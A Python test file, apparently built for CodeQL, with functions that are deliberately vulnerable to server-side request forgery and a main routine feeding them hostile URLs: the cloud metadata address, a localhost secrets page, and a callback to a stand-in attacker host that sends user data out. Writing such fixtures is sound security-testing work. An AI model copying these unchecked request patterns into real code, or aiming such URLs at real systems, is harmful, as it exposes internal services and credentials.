#!/usr/bin/env python3
"""
Server-Side Request Forgery (SSRF) vulnerabilities for CodeQL testing
"""
import requests
import urllib.request

def vulnerable_requests_get(url):
    """Function with SSRF via requests.get"""
    
    # VULNERABILITY: User input directly in HTTP request
    response = requests.get(url)  # SINK: HTTP request with user input
    return response.text

def vulnerable_urllib(target_url):
    """Function with SSRF via urllib"""
    
    # VULNERABILITY: User input in urllib request
    with urllib.request.urlopen(target_url) as response:  # SINK: URL request with user input
        return response.read()

def vulnerable_requests_post(api_endpoint, data):
    """Function with SSRF via POST request"""
    
    # VULNERABILITY: User input in POST endpoint
    response = requests.post(api_endpoint, json=data)  # SINK: POST request with user endpoint
    return response.json()

def fetch_user_data(user_id, callback_url):
    """Function that fetches data and calls back to user-provided URL"""
    
    # Simulate fetching user data
    user_data = {"id": user_id, "name": "John Doe"}
    
    # VULNERABILITY: User-controlled callback URL
    webhook_response = requests.post(callback_url, json=user_data)  # SINK: SSRF via callback
    
    return user_data

def main():
    # Test with malicious input
    malicious_url = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
    internal_url = "http://localhost:8080/admin/secrets"
    evil_callback = "http://attacker.com/steal-data"
    
    vulnerable_requests_get(malicious_url)
    vulnerable_urllib(internal_url)
    fetch_user_data("123", evil_callback)

if __name__ == "__main__":
    main()
